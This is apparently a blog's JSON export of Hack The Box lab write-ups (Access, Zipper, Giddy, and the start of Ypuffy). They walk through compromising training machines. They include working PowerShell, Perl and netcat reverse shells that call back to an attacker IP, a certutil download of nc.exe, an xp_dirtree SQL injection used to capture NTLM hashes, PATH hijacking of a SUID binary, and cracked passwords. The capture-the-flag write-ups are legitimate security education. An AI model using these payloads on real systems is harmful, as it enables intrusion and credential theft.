Server.*===============================================================C:\\Users\\security&gt;type desktop\\user.txtff1f3b&lt;redacted&gt;Priv esc with Windows Credentials ManagerOur security user doesn’t have any useful privileges or group memberships. That telnet shell was pretty slow and buggy. I tried running PowerShell but I wasn’t getting any output from the shell so instead I just spawned a reverse shell with Nishang:C:\\Users\\security&gt;powershell -command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159PS C:\\Users\\security&gt; whoamiaccess\\securityPS C:\\Users\\security&gt;PS C:\\Users\\security&gt; vaultcmd /listCurrently loaded vaults:\tVault: security's Vault\tVault Guid:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\tLocation: C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\tStatus: Unlocked\tVisibility: Not hidden\tVault: Windows Vault\tVault Guid:{77BC582B-F0A6-4E15-4E80-61736B6F3B29}\tLocation: C:\\Users\\security\\AppData\\Local\\Microsoft\\Vault\tStatus: Unlocked\tVisibility: Not hiddenAdministrator credentials saved in security user’s vault:PS C:\\Users\\security&gt; vaultcmd /listcreds:\"Windows Vault\"Credentials in vault: Windows VaultCredential schema: Windows Domain Password CredentialResource: Domain:interactive=ACCESS\\AdministratorIdentity: ACCESS\\AdministratorProperty (schema element id,value): (100,3)I tried using https://github.com/peewpw/Invoke-WCMDump to retrieve the plaintext credentials but that tool only works for “Generic” type credentials.So instead I just transferred netcat to the machine and popped a shell this way:PS C:\\Users\\security&gt; certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe****  Online  ****CertUtil: -URLCache command completed successfully.echo c:\\users\\security\\nc.exe -e cmd.exe 10.10.14.23 4444 &gt; shell.batrunas /user:administrator /savecred c:\\users\\security\\shell.batroot@darkisland:~/hackthebox/Machines/Access# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159Microsoft Windows [Version 6.1.7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved.C:\\Windows\\system32&gt;whoamiwhoamiaccess\\administratorC:\\Windows\\system32&gt;type c:\\users\\administrator\\desktop\\root.txttype c:\\users\\administrator\\desktop\\root.txt6e1586&lt;redacted&gt;"
  },
  
  {
    "title": "Zipper - Hack The Box",
    "url": "/posts/htb-writeup-zipper/",
    "categories": "hackthebox, infosec",
    "tags": "linux, zabbix, api, suid",
    "date": "2019-02-23 00:00:00 +0800",
    





    
    "snippet": "Zipper was a cool box that mixed some enumeration, API usage and a priv esc using a SUID binary. I had some problems at first getting into Zabbix when I found a possible username but didn’t think o...",
    "content": "Zipper was a cool box that mixed some enumeration, API usage and a priv esc using a SUID binary. I had some problems at first getting into Zabbix when I found a possible username but didn’t think of trying the same name as the password. The priv esc was pretty cool, I used ltrace to check which functions are called by the binary and I was able to understand what to do next without having to reverse the binary with IDA or R2.Quick summary  There’s a Zabbix server running and we can log in as guest and obtain the zapper username  We can’t log in as zapper on the GUI but we can issue API calls  We can create a script (thru API calls) and get RCE as user zabbix within a container  Then we find the zabbix DB credentials which can also be used to log in as user admin on Zabbix  We can then create a perl reverse shell script and make it run on the zabbix agent (running on the host OS)  The password for user zapper is found in the backup.sh script  We can then su to user zapper and upload our ssh key and get the user flag  The priv esc is a suid binary that executes the systemctl daemon-reload command  We can hijack this command by creating our own systemctl file (with a reverse shell), then modify the path so the suid file executes our file instead of /bin/systemctlDetailed stepsNmaproot@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.108Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-20 15:01 EDTNmap scan report for 10.10.10.108Host is up (0.021s latency).Not shown: 65532 closed portsPORT      STATE SERVICE    VERSION22/tcp    open  ssh        OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA)|   256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA)|_  256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519)80/tcp    open  http       Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works10050/tcp open  tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelZabbix initial enumerationPort 10050 hints to a zabbix installation, since this is the port used by the zabbix agent:root@ragingunicorn:~/hackthebox/Machines# nc -nv 10.10.10.108 10050(UNKNOWN) [10.10.10.108] 10050 (zabbix-agent) openWe found the zabbix installation under the /zabbix directory.The default credentials don’t work but we can log in as guest.There’s not much interesting except something about a Zapper's Backup Script:Making API calls with user zapperWe can then log in to Zabbix as user zapper with password zapper (had to guess that part). However, GUI access is not allowed.Zabbix has a REST API so we can use this instead to issue commands to Zabbix.The attack steps are:  Log in to API  Get list of Host IDs  Create a script with a simple reverse shell  Execute script (make sure to specify host ID)AuthenticationBody:Response:We got the following auth token which we’ll re-use for other API calls: e160aa247a18163cfabe3c5645c8500aGet list of Host IDsBody:Response:Create a script for RCEBody:Response:Execute scriptBody:First shell in the containerWe got a shell after executing the script from Zabbix:root@ragingunicorn:~# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 54366/bin/sh: 0: can't access tty; job control turned off$ iduid=103(zabbix) gid=104(zabbix) groups=104(zabbix)$ hostname8e5a23a4dfec$Based on the random hostname and the .dockerenv file in the root directory we can assume we’re currently in a container:drwxr-xr-x   1 root root 4096 Oct 20 19:27 .drwxr-xr-x   1 root root 4096 Oct 20 19:27 ..-rwxr-xr-x   1 root root    0 Oct 20 19:27 .dockerenvThere’s not much on this container except the Zabbix configuration file:$ pwd/etc/zabbix$ lsapache.confwebzabbix_server.conf$We can find some credentials in there:$ egrep \"DBUser|DBPassword\" zabbix_server.conf#       For SQLite3 path to database file must be provided. DBUser and DBPassword are ignored.### Option: DBUser# DBUser=DBUser=zabbix### Option: DBPasswordDBPassword=f.YMeMd$pTbpY3-449$  Username: zabbix  Password: f.YMeMd$pTbpY3-449Getting a shell on the host OSWe can log in to the Zabbix admin page with the admin username and f.YMeMd$pTbpY3-449 password.Under the Zabbix host, we can see that there are two hosts and one is running the Zabbix Agent.The agent is running on the host OS while the Zabbix server is running in a container so what we want to do is modify our existing script so its runs on the Zabbix Agent (therefore on the Host OS) instead of the server.We can now get a shell on the Host OS but it’s not stable and we lose the connection after a few seconds:root@ragingunicorn:~/htb/zipper# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 55348/bin/sh: 0: can't access tty; job control turned off$ hostnamezipper$ iduid=107(zabbix) gid=113(zabbix) groups=113(zabbix)$After trying a few other shells, I found the perl shell works better and is more stable:perl -e 'use Socket;$i=\"10.10.14.23\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'We now have a stable shell:root@ragingunicorn:~/htb/zipper# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 46178/bin/sh: 0: can't access tty; job control turned off$ w 20:56:27 up 20 min,  0 users,  load average: 0.02, 0.03, 0.04USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT$ iduid=107(zabbix) gid=113(zabbix) groups=113(zabbix)$ hostnamezipper$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'zabbix@zipper:/$We still can’t read user.txt though:cat: user.txt: Permission deniedzabbix@zipper:/home/zapper$But we find a password inside the backup.sh script:zabbix@zipper:/home/zapper/utils$ lsbackup.sh  zabbix-servicezabbix@zipper:/home/zapper/utils$ cat backup.sh#!/bin/bash## Quick script to backup all utilities in this folder to /backups#/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &amp;&gt;/dev/nullWe can su to zapper using the ZippityDoDah password:echo $?zabbix@zipper:/home/zapper/utils$ su zappersu zapperPassword: ZippityDoDah              Welcome to:███████╗██╗██████╗ ██████╗ ███████╗██████╗╚══███╔╝██║██╔══██╗██╔══██╗██╔════╝██╔══██╗  ███╔╝ ██║██████╔╝██████╔╝█████╗  ██████╔╝ ███╔╝  ██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗███████╗██║██║     ██║     ███████╗██║  ██║╚══════╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝[0] Packages Need To Be Updated[&gt;] Backups:zapper@zipper:~/utils$ cd ..cd ..zapper@zipper:~$ cat user.txtcat user.txtaa29e9&lt;redacted&gt;Priv escThere’s an interesting SUID file in the utils directory: zabbix-servicezapper@zipper:~/utils$ ls -lls -ltotal 12-rwxr-xr-x 1 zapper zapper  194 Sep  8 13:12 backup.sh-rwsr-sr-x 1 root   root   7556 Sep  8 13:05 zabbix-serviceThe file seems to control one of the zabbix service:zapper@zipper:~/utils$ ./zabbix-service./zabbix-servicestart or stop?: startstartTo see what it does, I used ltrace to check which functions are called:zapper@zipper:~/utils$ ltrace -s 256 ./zabbix-serviceltrace -s 256 ./zabbix-service__libc_start_main(0x45d6ed, 1, 0xbfb57f54, 0x45d840 &lt;unfinished ...&gt;setuid(0)                                        = -1setgid(0)                                        = -1printf(\"start or stop?: \")                       = 16fgets(start or stop?: startstart\"start\\n\", 10, 0xb7f345c0)                 = 0xbfb57e82strcspn(\"start\\n\", \"\\n\")                         = 5strcmp(\"start\", \"start\")                         = 0system(\"systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent\"Failed to reload daemon: The name org.freedesktop.PolicyKit1 was not provided by any .service files &lt;no return ...&gt;--- SIGCHLD (Child exited) ---&lt;... system resumed&gt; )                           = 256+++ exited (status 0) +++Based on the ltrace output, we see that the program executes systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent as user root.Because the program doesn’t execute systemctl using its full path, it is susceptible to hijacking by changing the PATH environment variable.We can write a simple bash script that spawns a reverse shell using a named pipe and name it systemctlzapper@zipper:~/utils$ cat systemctl#!/bin/shrm /tmp/f2;mkfifo /tmp/f2;/bin/cat /tmp/f2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.14.23 5555 &gt;/tmp/f2zapper@zipper:~/utils$ chmod +x systemctlchmod +x systemctlWe need to use /bin/cat instead of just cat because we’ll remove /bin from the PATH env variableNext, we remove /bin from the PATH and add /home/zapper/utils:zapper@zipper:~/utils$ echo $PATHecho $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gameszapper@zipper:~/utils$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/home/zapper/utils&lt;cal/bin:/usr/sbin:/usr/bin:/sbin:/home/zapper/utilsThen we execute zabbix-service and it spawn a shell as root.zapper@zipper:~/utils$ ./zabbix-service./zabbix-servicestart or stop?: startstart/home/zapper/utils/systemctl: 3: /home/zapper/utils/systemctl: rm: not foundroot@ragingunicorn:~/htb/zipper# nc -lvnp 5555listening on [any] 5555 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.108] 60846# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(zapper)# cat /root/root.txt/bin/sh: 2: cat: not found# /bin/cat /root/root.txta7c743&lt;redacted&gt;#"
  },
  
  {
    "title": "Giddy - Hack The Box",
    "url": "/posts/htb-writeup-giddy/",
    "categories": "hackthebox, infosec",
    "tags": "sqli, powershell",
    "date": "2019-02-16 00:00:00 +0800",
    





    
    "snippet": "Giddy from Hack the Box is being retired this week so I’ll go over the steps to pwn this box. For this one we need to find an easy SQL injection point in the web application then leverage this to t...",
    "content": "Giddy from Hack the Box is being retired this week so I’ll go over the steps to pwn this box. For this one we need to find an easy SQL injection point in the web application then leverage this to trigger an SMB connection back to our machine and use responder to capture some hashes. I learned a bit about Web powershell while doing this box as I didn’t know that even existed.Tools/Blogs used  https://github.com/SpiderLabs/Responder  Ubiquiti UniFi Video 3.7.3 - Local Privilege EscalationQuick summary  There’s an SQL injection in the generic products inventory page  Using the SQL injection in MSSQL, we can trigger an SMB connection back to us and get the NTLM hash with responder.py  The credentials are used to gain access to a restricted PS session through the Web Powershell interface  The Ubiquiti Unifi Video service has weak file permissions and allow us to upload an arbitrary file and execute it as SYSTEM  A reverse shell executable is compiled, uploaded and executed to get SYSTEM accessTools/Blogs used  mdbtools  readpstDetailed stepsNmapServices running:  HTTP(s)  RDP  WinRMroot@darkisland:~# nmap -sC -sV -p- 10.10.10.104Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-08 19:28 EDTNmap scan report for giddy.htb (10.10.10.104)Host is up (0.015s latency).Not shown: 65531 filtered portsPORT     STATE SERVICE       VERSION80/tcp   open  http          Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server443/tcp  open  ssl/http      Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS Windows Server| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite| Not valid before: 2018-06-16T21:28:55|_Not valid after:  2018-09-14T21:28:55|_ssl-date: 2018-09-08T23:26:04+00:00; -4m42s from scanner time.| tls-alpn: |   h2|_  http/1.13389/tcp open  ms-wbt-server Microsoft Terminal Services| ssl-cert: Subject: commonName=Giddy| Not valid before: 2018-06-16T01:04:03|_Not valid after:  2018-12-16T01:04:03|_ssl-date: 2018-09-08T23:26:04+00:00; -4m41s from scanner time.5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsWeb enumerationI found two interesting directories:  /mvc  /remoteroot@darkisland:~# gobuster -w SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.104=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://10.10.10.104/[+] Threads      : 50[+] Wordlist     : SecLists/Discovery/Web-Content/big.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 10s=====================================================2018/09/08 15:02:36 Starting gobuster=====================================================/aspnet_client (Status: 301)/mvc (Status: 301)/remote (Status: 302)=====================================================2018/09/08 15:03:13 Finished=====================================================Main pageThe main page has nothing interesting on it, just some image of a dog./remoteThe /remote URI contains a Windows PowerShell Web Access interface which we’ll use later./mvcThe /mvc URI is some generic demonstration ASP.NET page with a database backend. We can register a new user but there’s nothing interesting we can do with a user vs. an anonymous ession. The web application simply lists products from the database. There’s also a search function that we can use to look in the database.![]/assets/images/htb-writeup-giddy/(mvc1.png)The 1st SQL injection point is the search field since we can trigger an SQL error with a single quote.The 2nd SQL injection point is the GET parameter field in the product category, we can trigger an SQL error with a single quote also.GET: https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=18%27SQLmap can be used to enumerate the database contents:root@darkisland:~# sqlmap -u https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 --dbms=mssql --dbs        ___       __H__ ___ ___[,]_____ ___ ___  {1.2.8#stable}|_ -| . [']     | .'| . ||___|_  [']_|_|_|__,|  _|      |_|V          |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:46:05[19:46:05] [INFO] testing connection to the target URL[19:46:05] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS[19:46:05] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDSdo you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] [19:46:07] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')[19:46:07] [INFO] testing if the target URL content is stable[19:46:07] [WARNING] target URL content is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] [19:46:08] [INFO] searching for dynamic content[19:46:08] [INFO] dynamic content marked for removal (1 region)[...]GET parameter 'ProductSubCategoryId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:---Parameter: ProductSubCategoryId (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ProductSubCategoryId=1 AND 1298=1298    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)    Payload: ProductSubCategoryId=1 AND 1726 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (1726=1726) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: ProductSubCategoryId=(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (6760=6760) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: ProductSubCategoryId=1;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind (IF)    Payload: ProductSubCategoryId=1 WAITFOR DELAY '0:0:5'---[19:46:37] [INFO] testing Microsoft SQL Server[19:46:38] [INFO] confirming Microsoft SQL Server[19:46:38] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 10 or 2016web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0back-end DBMS: Microsoft SQL Server 2016[19:46:38] [INFO] fetching database names[19:46:38] [INFO] used SQL query returns 5 entries[19:46:38] [INFO] retrieved: Injection[19:46:38] [INFO] retrieved: master[19:46:38] [INFO] retrieved: model[19:46:38] [INFO] retrieved: msdb[19:46:38] [INFO] retrieved: tempdbavailable databases [5]:[*] Injection[*] master[*] model[*] msdb[*] tempdb[19:46:38] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 67 times[19:46:38] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.104'[*] shutting down at 19:46:38We found one of the local user: Stacy[19:48:06] [INFO] fetching current user[19:48:06] [INFO] retrieved: giddy\\\\stacycurrent user:    'giddy\\\\stacy'We can’t pull the users from the database since the current user doesn’t have sufficient privileges:[19:47:25] [WARNING] unable to retrieve the number of password hashes for user 'BUILTIN\\\\Users'[19:47:25] [INFO] fetching number of password hashes for user 'giddy\\\\stacy'[19:47:25] [INFO] retrieved: [19:47:25] [INFO] retrieved: [19:47:26] [WARNING] unable to retrieve the number of password hashes for user 'giddy\\\\stacy'[19:47:26] [INFO] fetching number of password hashes for user 'sa'[19:47:26] [INFO] retrieved: [19:47:26] [INFO] retrieved: [19:47:26] [WARNING] unable to retrieve the number of password hashes for user 'sa'[19:47:26] [ERROR] unable to retrieve the password hashes for the database users (probably because the DBMS current user has no read privileges over the relevant system database table(s))There’s nothing else of interest in the database, no credentials or any other hint.SMB hashesWe have a username but no password for that account. However we can force the MSSQL server to connect back to use with SMB and then use responder to get the NTLMv2 hash.MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the xp_dirtree function to list the files in our SMB share and grab the NTLMv2 hash.Query: GET /mvc/Product.aspx?ProductSubCategoryId=28;declare%20@q%20varchar(99);set%20@q=%27\\\\10.10.14.23\\test%27;exec%20master.dbo.xp_dirtree%20@q HTTP/1.1With responder.py we can grab the hash:[SMB] NTLMv2-SSP Client   : 10.10.10.104[SMB] NTLMv2-SSP Username : GIDDY\\Stacy[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1234567890123456:E5F6E4D55FD85E3C81554FD67088C8E2:0101000000000000CC831652C447D4014EC0AB8B8592622B0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000[SMB] Requested Share     : \\\\10.10.14.23\\IPC$[SMB] NTLMv2-SSP Client   : 10.10.10.104[SMB] NTLMv2-SSP Username : GIDDY\\Stacy[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:1234567890123456:C8FDC762ECE363F3B36E180C809B690D:0101000000000000E8DABE52C447D401D0CB7EFDCD2687540000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000[SMB] Requested Share     : \\\\10.10.14.23\\TESTHash: Stacy::GIDDY:1234567890123456:E5F6E4D55FD85E3C81554FD67088C8E2:0101000000000000CC831652C447D4014EC0AB8B8592622B0000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000003184F7110D23082928FF6CBBB72AEA07F35DCE741FC5B735D1B4780228A863AC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000The hash is crackable with the standard rockyou.txt list and we recover the password:root@darkisland:~/giddy# john --fork=4 -w=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Node numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statusxNnWo6272k7x     (Stacy)Password: xNnWo6272k7xPowershell web accessWe can now log in to the web powershell interface using:  Username: giddy\\stacy  Password: xNnWo6272k7x  Computer: giddyPrivescThe hint for the privesc is in the documents folder -&gt; unifivideoThere’s a local privilege escalation exploit with Ubiquiti UniFi Video 3.7.3. Basically, the privileges are not set correctly in the installation directory where the service is installed so any user can substitute the executable for the service with a malicious file and get RCE as SYSTEM.We confirm that the software is installed:First, we create a simple exe that spawn a netcat connection back to us:#include \"stdafx.h\"#include \"stdlib.h\"int main(){    system(\"nc.exe -e cmd.exe 10.10.14.23 4444\");    return 0;}To upload the .exe and netcat to the box, we can spawn an SMB server with Impacket:root@darkisland:~/giddy# python /usr/share/doc/python-impacket/examples/smbserver.py test .Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0[*] Config file parsed[*] Config file parsed[*] Config file parsedThen we copy the file to taskkill.exe as explained in the exploit description, then stop-start the service.root@darkisland:~/hackthebox/Machines/Giddy# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.104] 49805Microsoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved.C:\\ProgramData\\unifi-video&gt;whoamiwhoamint authority\\systemC:\\ProgramData\\unifi-video&gt;type c:\\users\\administrator\\desktop\\root.txttype c:\\users\\administrator\\desktop\\root.txtCF559C&lt;redacted&gt;C:\\ProgramData\\unifi-video&gt;Alternate shell methodInstead of using the Web Powershell interface, we can also log in with WinRM. To do that under Linux, I used Alamot’s WinRM ruby script:require 'winrm'# Author: Alamotconn = WinRM::Connection.new(   endpoint: 'http://10.10.10.104:5985/wsman',  #transport: :ssl,  user: 'stacy',  password: 'xNnWo6272k7x',  #:client_cert =&gt; 'certnew.cer',  #:client_key =&gt; 'privateKey.key',  #:no_ssl_peer_verification =&gt; true)command=\"\"conn.shell(:powershell) do |shell|    until command == \"exit\\n\" do        output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\")        print(output.output.chomp)        command = gets                output = shell.run(command) do |stdout, stderr|            STDOUT.print stdout            STDERR.print stderr        end    end        puts \"Exiting with code #{output.exitcode}\"end~/code-snippets/winrm# ruby giddy.rb PS giddy\\stacy@GIDDY Documents&gt; whoamigiddy\\stacy"
  },
  
  {
    "title": "Ypuffy - Hack The Box",
    "url": "/posts/htb-writeup-ypuffy/",
    "categories": "hackthebox, infosec",
    "tags": "openbsd, ssh, pass-the-hash, ldap, ca",
    "date": "2019-02-09 00:00:00 +0800",
    





    
    "snippet": "Ypuffy is being retired this weekend, so it’s time to do another writeup. I think this is the only OpenBSD machine so far on Hack the Box. The initial user part was not really difficult and involve...",
    "content": "Ypuffy is being retired this weekend, so it’s time to do another writeup. I think this is the only OpenBSD machine so far on Hack the Box. The initial user part was not really difficult and involved doing some basic LDAP edumeration to find an NTLM hash that can be used to access a Samba share and recover an SSH private key. The priv esc used CA signed SSH keys which is something I’ve never personally used before.Quick summary  The LDAP server allows anyone to connect and enumerate the contents  An NT hash is found in the LDAP directory for user alice1978  We can pass the hash to get access to the SMB share and download the SSH private key  User alice1978 can run ssh-keygen as user userca and sign a new DSA SSH key with a principal name associated with the root userTools/Blogs used  https://code.fb.com/security/scalable-and-secure-access-with-ssh/Detailed stepsPortscanI started with the typical nmap scan and found a couple of interesting ports in addition to the SSH and webserver: LDAP is running on this box and there is also Samba running.root@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.107Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 01:37 ESTNmap scan report for 10.10.10.107Host is up (0.015s latency).Not shown: 65530 closed portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)| ssh-hostkey: |   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)80/tcp  open  http        OpenBSD httpd139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)389/tcp open  ldap        (Anonymous bind OK)445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)Service Info: Host: YPUFFYHost script results:|_clock-skew: mean: -3h28m23s, deviation: 2h53m12s, median: -5h08m23s| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.7.6)|   Computer name: ypuffy|   NetBIOS computer name: YPUFFY\\x00|   Domain name: hackthebox.htb|   FQDN: ypuffy.hackthebox.htb|_  System time: 2019-02-07T20:29:50-05:00| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2019-02-07 20:29:50|_  start_date: N/AWeb server enumerationThe server doesn’t respond with anything when we connect to it:root@ragingunicorn:~# curl 10.10.10.107curl: (52) Empty reply from serverWe’ll come back to this later when we get user access to the box.SMB share enumerationI got an access denied when trying to check the shares. We’ll need the credentials to enumerate this further. More on this later on.root@ragingunicorn:~# smbmap -H 10.10.10.107[+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.107...[+] IP: 10.10.10.107:445\tName: 10.10.10.107                                      \tDisk                                                  \tPermissions\t----                                                  \t-----------[!] Access DeniedLDAP enumerationTo enumerate the LDAP, we need to give it the base dn to for the search. When I checked the output from nmap I saw the ypuffy.hackthebox.htb FQDN from the SMB discovery script. So I tried hackthebox.htb as domain to search from, luckily the box doesn’t require authentication to pull data from it.The most interesting entry is this one for alice1978 because it contains an NTLM hash. The userPassword field is not useful, it just contains {BSDAUTH}alice1978 in base64 encoded format.root@ragingunicorn:~# ldapsearch -h 10.10.10.107 -x -b \"dc=hackthebox,dc=htb\"[...]# alice1978, passwd, hackthebox.htbdn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htbuid: alice1978cn: AliceobjectClass: accountobjectClass: posixAccountobjectClass: topobjectClass: sambaSamAccountuserPassword:: e0JTREFVVEh9YWxpY2UxOTc4uidNumber: 5000gidNumber: 5000gecos: AlicehomeDirectory: /home/alice1978loginShell: /bin/kshsambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001displayName: AlicesambaAcctFlags: [U          ]sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8BsambaPwdLastSet: 1532916644[...]Passing the hashThe first thing I did was look up the NT hash online to see if I could quickly get the password but I didn’t find any match for this one. It probably uses a strong password which I won’t waste time cracking.We don’t have the password but 